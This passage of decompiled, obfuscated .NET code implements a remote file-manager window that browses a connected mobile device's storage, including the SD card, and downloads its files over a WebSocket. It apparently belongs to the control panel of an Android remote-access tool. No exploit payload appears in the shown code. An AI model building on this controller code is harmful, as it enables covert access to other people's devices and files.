			comsrchfor.Text = EXGuarder._3F663520;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._6B5E743F, TextCompare: false))
		{
			tabsfiles.TabPages[0].Text = EXGuarder._5904103D;
			tabsfiles.TabPages[1].Text = EXGuarder._4B0C2315;
			tabsfiles.TabPages[2].Text = EXGuarder._7700174A;
			emptytext.Text = EXGuarder._32625B1F;
			ctxMenu.Items[0].Text = EXGuarder._2B086A62;
			ToolStripMenuItem toolStripMenuItem2 = (ToolStripMenuItem)ctxMenu.Items[0];
			toolStripMenuItem2.DropDownItems[0].Text = EXGuarder._535F4E39;
			toolStripMenuItem2.DropDownItems[1].Text = EXGuarder._076C3564;
			toolStripMenuItem2.DropDownItems[2].Text = EXGuarder._4B0C2315;
			toolStripMenuItem2.DropDownItems[3].Text = EXGuarder._59644D56;
			toolStripMenuItem2.DropDownItems[4].Text = EXGuarder._34673C52;
			toolStripMenuItem2.DropDownItems[5].Text = EXGuarder._18253641;
			BTtiptool.SetToolTip(shortbtn1, EXGuarder._535F4E39);
			BTtiptool.SetToolTip(shortbtn2, EXGuarder._076C3564);
			BTtiptool.SetToolTip(shortbtn4, EXGuarder._4B0C2315);
			BTtiptool.SetToolTip(shortbtn3, EXGuarder._59644D56);
			BTtiptool.SetToolTip(shortbtn6, EXGuarder._34673C52);
			BTtiptool.SetToolTip(shortbtn5, EXGuarder._18253641);
			ctxMenu.Items[1].Text = EXGuarder._665E0250;
			ctxMenu.Items[2].Text = EXGuarder._4A300444;
			ctxMenu.Items[3].Text = EXGuarder._79672541;
			ctxMenu.Items[4].Text = EXGuarder._2D097573;
			ctxMenu.Items[5].Text = EXGuarder._750C4A23;
			ctxMenu.Items[6].Text = EXGuarder._4B0C2315;
			ctxMenu.Items[7].Text = EXGuarder._26000818;
			ctxMenu.Items[8].Text = EXGuarder._3E084812;
			ctxMenu.Items[9].Text = EXGuarder._2D1A0C2C;
			ctxMenu.Items[10].Text = EXGuarder._17661000;
			ctxMenu.Items[11].Text = EXGuarder._0B3A350A;
			ctxMenu.Items[12].Text = EXGuarder._76630D22;
			ctxMenu.Items[13].Text = EXGuarder._506A6F53;
			ctxMenu.Items[14].Text = EXGuarder._3E753B6C;
			ctxMenu.Items[15].Text = EXGuarder._45250A46;
			ctxMenu.Items[16].Text = EXGuarder._4C234706;
			ctxMenu.Items[17].Text = EXGuarder._305C5D54;
			ctxMenu.Items[18].Text = EXGuarder._66177449;
			ctxMenu.Items[19].Text = EXGuarder._0F556E5D;
			ctxMenu.Items[20].Text = EXGuarder._67304852;
			searchtext.Watermark = EXGuarder._495B3145;
			srchfilsbtn.Text = EXGuarder._1A173F42;
			clrbtn.Text = EXGuarder._134D3E68;
			Label3.Text = EXGuarder._145F6753;
			comsrchfor.Text = EXGuarder._0F0E1840;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._1B516C4E, TextCompare: false))
		{
			tabsfiles.TabPages[0].Text = EXGuarder._16746149;
			tabsfiles.TabPages[1].Text = EXGuarder._7868163A;
			tabsfiles.TabPages[2].Text = EXGuarder._343B6416;
			emptytext.Text = EXGuarder._543A4401;
			ctxMenu.Items[0].Text = EXGuarder._28562F3B;
			ToolStripMenuItem toolStripMenuItem3 = (ToolStripMenuItem)ctxMenu.Items[0];
			toolStripMenuItem3.DropDownItems[0].Text = EXGuarder._6974152A;
			toolStripMenuItem3.DropDownItems[1].Text = EXGuarder._43076628;
			toolStripMenuItem3.DropDownItems[2].Text = EXGuarder._7868163A;
			toolStripMenuItem3.DropDownItems[3].Text = EXGuarder._2F5A3C4D;
			toolStripMenuItem3.DropDownItems[4].Text = EXGuarder._30344724;
			toolStripMenuItem3.DropDownItems[5].Text = EXGuarder._71447610;
			BTtiptool.SetToolTip(shortbtn1, EXGuarder._6974152A);
			BTtiptool.SetToolTip(shortbtn2, EXGuarder._43076628);
			BTtiptool.SetToolTip(shortbtn4, EXGuarder._7868163A);
			BTtiptool.SetToolTip(shortbtn3, EXGuarder._2F5A3C4D);
			BTtiptool.SetToolTip(shortbtn6, EXGuarder._30344724);
			BTtiptool.SetToolTip(shortbtn5, EXGuarder._71447610);
			ctxMenu.Items[1].Text = EXGuarder._3F2A425C;
			ctxMenu.Items[2].Text = EXGuarder._3516344B;
			ctxMenu.Items[3].Text = EXGuarder._4317760D;
			ctxMenu.Items[4].Text = EXGuarder._315C1D2B;
			ctxMenu.Items[5].Text = EXGuarder._102E571D;
			ctxMenu.Items[6].Text = EXGuarder._78127618;
			ctxMenu.Items[7].Text = EXGuarder._3E224D1B;
			ctxMenu.Items[8].Text = EXGuarder._55225670;
			ctxMenu.Items[9].Text = EXGuarder._232C0005;
			ctxMenu.Items[10].Text = EXGuarder._74025F21;
			ctxMenu.Items[11].Text = EXGuarder._5D587469;
			ctxMenu.Items[12].Text = EXGuarder._60696D35;
			ctxMenu.Items[13].Text = EXGuarder._4A1F351D;
			ctxMenu.Items[14].Text = EXGuarder._4C652C76;
			ctxMenu.Items[15].Text = EXGuarder._5A2E051C;
			ctxMenu.Items[16].Text = EXGuarder._3E1D0634;
			ctxMenu.Items[17].Text = EXGuarder._19082F55;
			ctxMenu.Items[18].Text = EXGuarder._4121315A;
			ctxMenu.Items[19].Text = EXGuarder._040F2975;
			ctxMenu.Items[20].Text = EXGuarder._52633021;
			searchtext.Watermark = EXGuarder._72404029;
			srchfilsbtn.Text = EXGuarder._215A3D79;
			clrbtn.Text = EXGuarder._03442B59;
			Label3.Text = EXGuarder._40156239;
			comsrchfor.Text = EXGuarder._6F495841;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._49642204, TextCompare: false))
		{
			tabsfiles.TabPages[0].Text = EXGuarder._6617404A;
			tabsfiles.TabPages[1].Text = EXGuarder._1741030A;
			tabsfiles.TabPages[2].Text = EXGuarder._3952034D;
			emptytext.Text = EXGuarder._20080709;
			ctxMenu.Items[0].Text = EXGuarder._5C302463;
			ToolStripMenuItem toolStripMenuItem4 = (ToolStripMenuItem)ctxMenu.Items[0];
			toolStripMenuItem4.DropDownItems[0].Text = EXGuarder._380C463E;
			toolStripMenuItem4.DropDownItems[1].Text = EXGuarder._562B2479;
			toolStripMenuItem4.DropDownItems[2].Text = EXGuarder._1741030A;
			toolStripMenuItem4.DropDownItems[3].Text = EXGuarder._07447018;
			toolStripMenuItem4.DropDownItems[4].Text = EXGuarder._1A584863;
			toolStripMenuItem4.DropDownItems[5].Text = EXGuarder._3E2C6768;
			BTtiptool.SetToolTip(shortbtn1, EXGuarder._380C463E);
			BTtiptool.SetToolTip(shortbtn2, EXGuarder._562B2479);
			BTtiptool.SetToolTip(shortbtn4, EXGuarder._1741030A);
			BTtiptool.SetToolTip(shortbtn3, EXGuarder._07447018);
			BTtiptool.SetToolTip(shortbtn6, EXGuarder._1A584863);
			BTtiptool.SetToolTip(shortbtn5, EXGuarder._3E2C6768);
			ctxMenu.Items[1].Text = EXGuarder._2E0D1764;
			ctxMenu.Items[2].Text = EXGuarder._3B070D48;
			ctxMenu.Items[3].Text = EXGuarder._5A0B5D62;
			ctxMenu.Items[4].Text = EXGuarder._02152A51;
			ctxMenu.Items[5].Text = EXGuarder._543F4C0F;
			ctxMenu.Items[6].Text = EXGuarder._7809216D;
			ctxMenu.Items[7].Text = EXGuarder._3B481239;
			ctxMenu.Items[8].Text = EXGuarder._47073F07;
			ctxMenu.Items[9].Text = EXGuarder._040B265A;
			ctxMenu.Items[10].Text = EXGuarder._77080F79;
			ctxMenu.Items[11].Text = EXGuarder._78197371;
			ctxMenu.Items[12].Text = EXGuarder._52270215;
			ctxMenu.Items[13].Text = EXGuarder._3F4A7267;
			ctxMenu.Items[14].Text = EXGuarder._59660822;
			ctxMenu.Items[15].Text = EXGuarder._7511430C;
			ctxMenu.Items[16].Text = EXGuarder._635E373C;
			ctxMenu.Items[17].Text = EXGuarder._7429381C;
			ctxMenu.Items[18].Text = EXGuarder._063C2772;
			ctxMenu.Items[19].Text = EXGuarder._540C0C69;
			ctxMenu.Items[20].Text = EXGuarder._184A060D;
			searchtext.Watermark = EXGuarder._09466F3E;
			srchfilsbtn.Text = EXGuarder._2149513C;
			clrbtn.Text = EXGuarder._58742507;
			Label3.Text = EXGuarder._19556772;
			comsrchfor.Text = EXGuarder._1C3D5857;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._5F396B25, TextCompare: false))
		{
			tabsfiles.TabPages[0].Text = EXGuarder._34006610;
			tabsfiles.TabPages[1].Text = EXGuarder._026E3674;
			tabsfiles.TabPages[2].Text = EXGuarder._30464E61;
			emptytext.Text = EXGuarder._21303774;
			ctxMenu.Items[0].Text = EXGuarder._410B2917;
			ToolStripMenuItem toolStripMenuItem5 = (ToolStripMenuItem)ctxMenu.Items[0];
			toolStripMenuItem5.DropDownItems[0].Text = EXGuarder._05777130;
			toolStripMenuItem5.DropDownItems[1].Text = EXGuarder._6D030607;
			toolStripMenuItem5.DropDownItems[2].Text = EXGuarder._026E3674;
			toolStripMenuItem5.DropDownItems[3].Text = EXGuarder._285B4F09;
			toolStripMenuItem5.DropDownItems[4].Text = EXGuarder._5F334670;
			toolStripMenuItem5.DropDownItems[5].Text = EXGuarder._29092F0A;
			BTtiptool.SetToolTip(shortbtn1, EXGuarder._05777130);
			BTtiptool.SetToolTip(shortbtn2, EXGuarder._6D030607);
			BTtiptool.SetToolTip(shortbtn4, EXGuarder._026E3674);
			BTtiptool.SetToolTip(shortbtn3, EXGuarder._285B4F09);
			BTtiptool.SetToolTip(shortbtn6, EXGuarder._5F334670);
			BTtiptool.SetToolTip(shortbtn5, EXGuarder._29092F0A);
			ctxMenu.Items[1].Text = EXGuarder._781B1F39;
			ctxMenu.Items[2].Text = EXGuarder._0D30242A;
			ctxMenu.Items[3].Text = EXGuarder._07446A11;
			ctxMenu.Items[4].Text = EXGuarder._674C633B;
			ctxMenu.Items[5].Text = EXGuarder._504E2353;
			ctxMenu.Items[6].Text = EXGuarder._36163460;
			ctxMenu.Items[7].Text = EXGuarder._49564601;
			ctxMenu.Items[8].Text = EXGuarder._09761928;
			ctxMenu.Items[9].Text = EXGuarder._4E730D46;
			ctxMenu.Items[10].Text = EXGuarder._535F7305;
			ctxMenu.Items[11].Text = EXGuarder._30183467;
			ctxMenu.Items[12].Text = EXGuarder._3F2A4D65;
			ctxMenu.Items[13].Text = EXGuarder._050B5111;
			ctxMenu.Items[14].Text = EXGuarder._11035B76;
			ctxMenu.Items[15].Text = EXGuarder._66100171;
			ctxMenu.Items[16].Text = EXGuarder._59070D28;
			ctxMenu.Items[17].Text = EXGuarder._79584611;
			ctxMenu.Items[18].Text = EXGuarder._49054F70;
			ctxMenu.Items[19].Text = EXGuarder._3F135D3A;
			ctxMenu.Items[20].Text = EXGuarder._03454378;
			searchtext.Watermark = EXGuarder._73106E12;
			srchfilsbtn.Text = EXGuarder._40413160;
			clrbtn.Text = EXGuarder._33384104;
			Label3.Text = EXGuarder._351E1B47;
			comsrchfor.Text = EXGuarder._224B2902;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._37563611, TextCompare: false))
		{
			tabsfiles.TabPages[0].Text = EXGuarder._63071F01;
			tabsfiles.TabPages[1].Text = EXGuarder._69050311;
			tabsfiles.TabPages[2].Text = EXGuarder._44102553;
			emptytext.Text = EXGuarder._26425178;
			ctxMenu.Items[0].Text = EXGuarder._32211064;
			ToolStripMenuItem toolStripMenuItem6 = (ToolStripMenuItem)ctxMenu.Items[0];
			toolStripMenuItem6.DropDownItems[0].Text = EXGuarder._66034927;
			toolStripMenuItem6.DropDownItems[1].Text = EXGuarder._520E6F0B;
			toolStripMenuItem6.DropDownItems[2].Text = EXGuarder._69050311;
			toolStripMenuItem6.DropDownItems[3].Text = EXGuarder._00623935;
			toolStripMenuItem6.DropDownItems[4].Text = EXGuarder._5C4B1F0F;
			toolStripMenuItem6.DropDownItems[5].Text = EXGuarder._37750B38;
			BTtiptool.SetToolTip(shortbtn1, EXGuarder._66034927);
			BTtiptool.SetToolTip(shortbtn2, EXGuarder._520E6F0B);
			BTtiptool.SetToolTip(shortbtn4, EXGuarder._69050311);
			BTtiptool.SetToolTip(shortbtn3, EXGuarder._00623935);
			BTtiptool.SetToolTip(shortbtn6, EXGuarder._5C4B1F0F);
			BTtiptool.SetToolTip(shortbtn5, EXGuarder._37750B38);
			ctxMenu.Items[1].Text = EXGuarder._781B1F39;
			ctxMenu.Items[2].Text = EXGuarder._0D30242A;
			ctxMenu.Items[3].Text = EXGuarder._07446A11;
			ctxMenu.Items[4].Text = EXGuarder._60220364;
			ctxMenu.Items[5].Text = EXGuarder._42763762;
			ctxMenu.Items[6].Text = EXGuarder._4D170E22;
			ctxMenu.Items[7].Text = EXGuarder._1506275E;
			ctxMenu.Items[8].Text = EXGuarder._100C0759;
			ctxMenu.Items[9].Text = EXGuarder._4E730D46;
			ctxMenu.Items[10].Text = EXGuarder._6B453F38;
			ctxMenu.Items[11].Text = EXGuarder._1F051272;
			ctxMenu.Items[12].Text = EXGuarder._1A470A0A;
			ctxMenu.Items[13].Text = EXGuarder._7835373F;
			ctxMenu.Items[14].Text = EXGuarder._09722A3D;
			ctxMenu.Items[15].Text = EXGuarder._6B70580F;
			ctxMenu.Items[16].Text = EXGuarder._59070D28;
			ctxMenu.Items[17].Text = EXGuarder._79584611;
			ctxMenu.Items[18].Text = EXGuarder._4F062A06;
			ctxMenu.Items[19].Text = EXGuarder._5C111D73;
			ctxMenu.Items[20].Text = EXGuarder._4F745F03;
			searchtext.Watermark = EXGuarder._1D5E2C39;
			srchfilsbtn.Text = EXGuarder._48194066;
			clrbtn.Text = EXGuarder._19220648;
			Label3.Text = EXGuarder._3A35030C;
			comsrchfor.Text = EXGuarder._54552007;
		}
	}

	public filesmanager()
	{
		base.Load += filesmanager_Load;
		base.FormClosing += filesmanager_FormClosing;
		Clipboard = new List<Array>();
		downloads = new Dictionary<string, DownloadData>();
		visited = new Dictionary<string, string>();
		downloadsLock = RuntimeHelpers.GetObjectValue(new object());
		isloading = true;
		searchbefore = new List<FileRow>();
		lastsearchplace = EXGuarder._183F272E;
		loadimages = false;
		downloadsrows = new Dictionary<string, DataGridViewRow>();
		_thumbView = false;
		InitializeComponent();
	}

	private void titlestng_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
			{
				Nativz.ReleaseCapture();
				Nativz.SendMessage(base.Handle, 161, 2, 0);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeWidth_W7_MouseDown(object sender, MouseEventArgs e)
	{
		movX = true;
		Mx = Control.MousePosition.X;
		Sw = base.Width;
	}

	private void DrakeWidth_W7_MouseMove(object sender, MouseEventArgs e)
	{
		if (movX)
		{
			base.Width = checked(Control.MousePosition.X - Mx + Sw);
		}
	}

	private void DrakeWidth_W7_MouseUp(object sender, MouseEventArgs e)
	{
		movX = false;
	}

	private void DrakeWidth_W8_MouseDown(object sender, MouseEventArgs e)
	{
		movY = true;
		Myyy = Control.MousePosition.Y;
		Sh = base.Height;
	}

	private void DrakeWidth_W8_MouseMove(object sender, MouseEventArgs e)
	{
		if (movY)
		{
			base.Height = checked(Control.MousePosition.Y - Myyy + Sh);
		}
	}

	private void DrakeWidth_W8_MouseUp(object sender, MouseEventArgs e)
	{
		movY = false;
	}

	private void filesmanager_Load(object sender, EventArgs e)
	{
		try
		{
			ctxMenu.Renderer = new MyRenderer();
			ctxdowns.Renderer = new MyRenderer();
			DataGridView dGVDATA = DGVDATA;
			dGVDATA.EnableHeadersVisualStyles = false;
			dGVDATA.CellBorderStyle = DataGridViewCellBorderStyle.None;
			dGVDATA.RowHeadersVisible = false;
			dGVDATA.GridColor = Color.FromArgb(6, 10, 15);
			dGVDATA.BackgroundColor = Color.FromArgb(6, 10, 15);
			dGVDATA.DefaultCellStyle.BackColor = Color.FromArgb(6, 10, 15);
			dGVDATA.DefaultCellStyle.SelectionBackColor = Color.FromArgb(14, 22, 33);
			dGVDATA = null;
			codes.SetDoubleBuffered(DGVDATA);
			DGVDATA.RowTemplate.Height = 55;
			ConfigureFastObjectListView();
			object value = BTRegistry.GetValue(EXGuarder._026E4621, EXGuarder._52535B6F);
			if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._1412074A, TextCompare: false))
			{
				listfilesvew.RowHeight = 75;
				toggleview.Symbol = 61542;
			}
			else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._52535B6F, TextCompare: false))
			{
				listfilesvew.RowHeight = 25;
				toggleview.Symbol = 61502;
			}
			myico.Image = Btcli.wallpaper;
			myscr.Image = Btcli.screen;
			pathtxt.FillColor = Color.FromArgb(45, 45, 45);
			pathtxt.ForeColor = Color.White;
			translateme();
			if (BTRegistry.ReadBool(EXGuarder._463E4B65, defaultValue: true))
			{
				LoadThumbs();
				autoloadtogle.ForeColor = Color.Lime;
				autoloadtogle.RectColor = Color.Lime;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox(ex2.Message);
			ProjectData.ClearProjectError();
		}
		refresher.Start();
		statetimer.Start();
		if (!backgroundWorker.IsBusy)
		{
			backgroundWorker.RunWorkerAsync();
		}
	}

	private void refresher_Tick(object sender, EventArgs e)
	{
		try
		{
			string path = Conversions.ToString(Operators.ConcatenateObject(Btcli.userfolder + EXGuarder._5D586E6F, NewLateBinding.LateGet(listfilesvew.Tag, null, EXGuarder._5958743D, new object[2]
			{
				EXGuarder._65134440,
				EXGuarder._49780B4D
			}, null, null, null)));
			int num = 0;
			if (Directory.Exists(path))
			{
				num = Directory.GetFiles(path, EXGuarder._2D39150E).Count();
			}
			int num2 = checked(listfilesvew.Items.Count - 1);
			int count = Clipboard.Count;
			statetext.Text = string.Format(EXGuarder._32361B22, BTConst.allstr) + Conversions.ToString(num2);
			statetext.Text += Strings.Space(10);
			Label label;
			(label = statetext).Text = label.Text + string.Format(EXGuarder._32361B22, BTConst.Selectedstr) + Conversions.ToString(listfilesvew.SelectedObjects.Count);
			statetext.Text += Strings.Space(10);
			(label = statetext).Text = label.Text + string.Format(EXGuarder._32361B22, BTConst.Downloadsstr) + Conversions.ToString(DGVDATA.Rows.Count);
			statetext.Text += Strings.Space(10);
			(label = statetext).Text = label.Text + string.Format(EXGuarder._32361B22, BTConst.seenstr) + num + ((count > 0) ? (Strings.Space(10) + string.Format(EXGuarder._32361B22, BTConst.clipbstr) + Conversions.ToString(Clipboard.Count)) : EXGuarder._0A615B13);
			if (DGVDATA.Rows.Count > 0)
			{
				tabsfiles.TabPages[1].Text = EXGuarder._07696227 + DGVDATA.Rows.Count + EXGuarder._2D110D42 + BTConst.Downloadsstr;
			}
			else
			{
				tabsfiles.TabPages[1].Text = BTConst.Downloadsstr;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public void ConfigureFastObjectListView()
	{
		FastObjectListView fastObjectListView = listfilesvew;
		fastObjectListView.ClearObjects();
		fastObjectListView.Columns.Clear();
		fastObjectListView.MultiSelect = true;
		fastObjectListView.FullRowSelect = true;
		fastObjectListView.AllowDrop = false;
		fastObjectListView.IsSimpleDragSource = false;
		fastObjectListView.IsSimpleDropSink = false;
		fastObjectListView.SelectColumnsOnRightClick = false;
		fastObjectListView.CellEditActivation = ObjectListView.CellEditActivateMode.None;
		fastObjectListView.BackColor = Color.FromArgb(6, 10, 15);
		fastObjectListView.ForeColor = Color.White;
		fastObjectListView.Font = new Font(EXGuarder._405A1D71, 9f);
		fastObjectListView.GridLines = false;
		fastObjectListView.FullRowSelect = true;
		fastObjectListView.HighlightBackgroundColor = Color.FromArgb(55, 55, 55);
		fastObjectListView.UseAlternatingBackColors = false;
		fastObjectListView.AlternateRowBackColor = Color.FromArgb(6, 10, 15);
		fastObjectListView.RowHeight = 25;
		OLVColumn oLVColumn = new OLVColumn(EXGuarder._0D5E3055, null);
		oLVColumn.AspectGetter = [SpecialName] (object rowObject) =>
		{
			try
			{
				FileRow fileRow = (FileRow)rowObject;
				if (fileRow == null)
				{
					return Resources.info_blue.Clone();
				}
				return fileRow.Icon;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
			return new Bitmap(1, 1);
		};
		oLVColumn.Renderer = new ImageRenderer();
		oLVColumn.Width = 70;
		oLVColumn.Sortable = false;
		oLVColumn.IsEditable = false;
		fastObjectListView.AllColumns.Add(oLVColumn);
		OLVColumn oLVColumn2 = new OLVColumn(EXGuarder._75211E48, EXGuarder._75211E48);
		oLVColumn2.Width = 200;
		oLVColumn2.MaximumWidth = 400;
		fastObjectListView.AllColumns.Add(oLVColumn2);
		OLVColumn oLVColumn3 = new OLVColumn(EXGuarder._46485D5B, EXGuarder._37372237);
		oLVColumn3.Width = 120;
		fastObjectListView.AllColumns.Add(oLVColumn3);
		OLVColumn oLVColumn4 = new OLVColumn(EXGuarder._3D4C0A53, EXGuarder._1F607574);
		oLVColumn4.Width = 100;
		fastObjectListView.AllColumns.Add(oLVColumn4);
		OLVColumn oLVColumn5 = new OLVColumn(EXGuarder._0D1C1F2D, EXGuarder._1715784B);
		oLVColumn5.Width = 140;
		fastObjectListView.AllColumns.Add(oLVColumn5);
		OLVColumn oLVColumn6 = new OLVColumn(EXGuarder._46675B40, EXGuarder._3853764A);
		oLVColumn6.FillsFreeSpace = true;
		oLVColumn6.Width = 140;
		fastObjectListView.AllColumns.Add(oLVColumn6);
		fastObjectListView.RebuildColumns();
		fastObjectListView.OwnerDraw = true;
		ThumbnailRenderer thumbnailRenderer = new ThumbnailRenderer();
		thumbnailRenderer.ThumbSize = new Size(96, 96);
		fastObjectListView.ItemRenderer = thumbnailRenderer;
		ImageList imageList = new ImageList();
		imageList.ColorDepth = ColorDepth.Depth32Bit;
		imageList.ImageSize = thumbnailRenderer.ThumbSize;
		imageList.Images.Add(new Bitmap(1, 1));
		fastObjectListView.LargeImageList = imageList;
		fastObjectListView.View = View.Details;
		fastObjectListView = null;
		listfilesvew.DoubleBuffered();
		listfilesvew.RowFormatter = [SpecialName] (OLVListItem olvItem) =>
		{
			try
			{
				FileRow fileRow = (FileRow)olvItem.RowObject;
				if (fileRow != null)
				{
					if (Operators.CompareString(fileRow.ModifiedDate, fileRow.CreateDate, TextCompare: false) == 0)
					{
						olvItem.ForeColor = Color.Red;
					}
					else
					{
						olvItem.ForeColor = Color.White;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		};
		listfilesvew.Sorting = SortOrder.None;
	}

	private void listfilesvew_SelectedIndexChanged(object sender, EventArgs e)
	{
		try
		{
			if (listfilesvew.SelectedObjects.Count != 1)
			{
				return;
			}
			FileRow fileRow = (FileRow)listfilesvew.SelectedObjects[0];
			if (fileRow == null || !fileRow.IsFile)
			{
				viwimage.Image = null;
				return;
			}
			string text = Conversions.ToString(listfilesvew.Tag);
			string name = fileRow.Name;
			string text2 = text + EXGuarder._35722749 + name;
			string text3 = Btcli.userfolder + EXGuarder._2A027549 + codes.CleanFolderPath(text.Replace(EXGuarder._35722749, EXGuarder._701F1B05));
			string text4 = text2.ToLower();
			string text5 = text2.Substring(checked(text2.LastIndexOf(EXGuarder._35722749) + 1));
			bool flag = false;
			if (text4.EndsWith(EXGuarder._6F5D0444) || text4.EndsWith(EXGuarder._5F364B07))
			{
				string text6 = text5.Replace(EXGuarder._6F5D0444, EXGuarder._2C142551).Replace(EXGuarder._5F364B07, EXGuarder._2C142551);
				string text7 = text3 + EXGuarder._701F1B05 + text6;
				if (Directory.Exists(text7))
				{
					using IEnumerator<string> enumerator = MyProject.Computer.FileSystem.GetFiles(text7).GetEnumerator();
					if (enumerator.MoveNext())
					{
						string current = enumerator.Current;
						FileInfo fileInfo = MyProject.Computer.FileSystem.GetFileInfo(current);
						viwimage.Image = codes.ReadBitmapFromFile(text7 + EXGuarder._701F1B05 + fileInfo.Name);
						flag = true;
					}
				}
			}
			if (flag)
			{
				return;
			}
			if (Directory.Exists(text3))
			{
				string text8 = codes.CleanFileName(text5);
				string text9 = text3 + EXGuarder._701F1B05 + text8;
				if (File.Exists(text9))
				{
					try
					{
						if (viwimage.Image != null)
						{
							viwimage.Image = null;
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						ProjectData.ClearProjectError();
					}
					viwimage.Image = codes.ReadBitmapFromFile(text9);
					flag = true;
				}
			}
			if (!flag)
			{
				object obj = EXGuarder._484A2C59;
				string t = name.ToLower();
				if (MyRes.ISupportedImages(t))
				{
					obj = EXGuarder._2658035E;
				}
				else if (MyRes.ISupportedVideo(t))
				{
					obj = EXGuarder._1235071B;
				}
				if (Operators.ConditionalCompareObjectNotEqual(obj, EXGuarder._484A2C59, TextCompare: false) && Btcli.isConnected)
				{
					VB_0024AnonymousType_4<string, string, string, string, object> data = new VB_0024AnonymousType_4<string, string, string, string, object>(EXGuarder._744A0076, text2, EXGuarder._20243156, Btcli.SecoundIDF, obj);
					string value = BTCommand.FormatCommand(EXGuarder._382D1F44, data);
					Dictionary<string, object> dictionary = new Dictionary<string, object>();
					dictionary.Add(EXGuarder._13692F6D, BTConst.wrk);
					dictionary.Add(EXGuarder._6A54020C, value);
					Dictionary<string, object> chatData = dictionary;
					BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
				}
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.ClearProjectError();
		}
	}

	private object Pback(string p)
	{
		object result;
		try
		{
			string text = string.Format(EXGuarder._6F6F4C5D, p.Substring(0, p.LastIndexOf(EXGuarder._5160316C)));
			result = (text.Contains(EXGuarder._5160316C) ? text : EXGuarder._5160316C);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			result = p;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private object Pnext(string p, string n)
	{
		return string.Format(EXGuarder._3241036F, p, n);
	}

	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		if (Btcli.isConnected)
		{
			navigateto(Conversions.ToString(Pback(Conversions.ToString(listfilesvew.Tag))));
		}
	}

	private void navigateto(string thepath)
	{
		VB_0024AnonymousType_10<string, string> data = new VB_0024AnonymousType_10<string, string>(EXGuarder._0D6A163E, thepath);
		string value = BTCommand.FormatCommand(EXGuarder._66783B3B, data);
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._2F235738, BTConst.wrk);
		dictionary.Add(EXGuarder._3E6F0149, value);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		baseloader.Enabled = true;
		baseloader.Visible = true;
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (Btcli.isConnected)
		{
			navigateto(pathtxt.Text);
		}
	}

	private void ToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (Btcli.isConnected)
		{
			navigateto(EXGuarder._44553450);
		}
	}

	private void ToolStripMenuItem3_Click(object sender, EventArgs e)
	{
		if (Btcli.isConnected)
		{
			navigateto(EXGuarder._1E303562);
		}
	}

	private void ToolStripMenuItem4_Click(object sender, EventArgs e)
	{
		if (Btcli.isConnected)
		{
			navigateto(EXGuarder._503D0328);
		}
	}

	private void ToolStripMenuItem5_Click(object sender, EventArgs e)
	{
		if (Btcli.isConnected)
		{
			navigateto(EXGuarder._23190844);
		}
	}

	private void ToolStripMenuItem6_Click(object sender, EventArgs e)
	{
		if (Btcli.isConnected)
		{
			navigateto(EXGuarder._2207231D);
		}
	}

	private void SDCARDToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Btcli.isConnected)
		{
			navigateto(EXGuarder._4E5F0869);
		}
	}

	private void searchtext_TextChanged(object sender, EventArgs e)
	{
		if (!string.IsNullOrEmpty(searchtext.Text))
		{
			TrySearch();
		}
		else
		{
			ShowAllRows();
		}
	}

	private void ShowAllRows()
	{
		try
		{
			if (Operators.CompareString(lastsearchplace, pathtxt.Text, TextCompare: false) == 0)
			{
				listfilesvew.ClearObjects();
				listfilesvew.AddObjects(searchbefore);
			}
			searchbefore.Clear();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			BTAlerter.erroes(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	public void TrySearch()
	{
		try
		{
			if (!string.IsNullOrEmpty(searchtext.Text))
			{
				string value = searchtext.Text.ToLower();
				if (searchbefore.Count == 0)
				{
					searchbefore.AddRange(listfilesvew.Objects.Cast<FileRow>());
				}
				lastsearchplace = pathtxt.Text;
				listfilesvew.BeginUpdate();
				listfilesvew.ClearObjects();
				List<FileRow> modelObjects = searchbefore.Where([SpecialName] (FileRow row) => row.Name.ToLower().Contains(value) || row.TypeDescription.ToLower().Contains(value) || row.SizeDescription.ToLower().Contains(value) || row.ModifiedDate.ToString().ToLower().Contains(value) || row.CreateDate.ToString().ToLower().Contains(value)).ToList();
				listfilesvew.AddObjects(modelObjects);
				listfilesvew.Refresh();
				listfilesvew.EndUpdate();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			BTAlerter.erroes(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void statetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			if (Btcli.isConnected)
			{
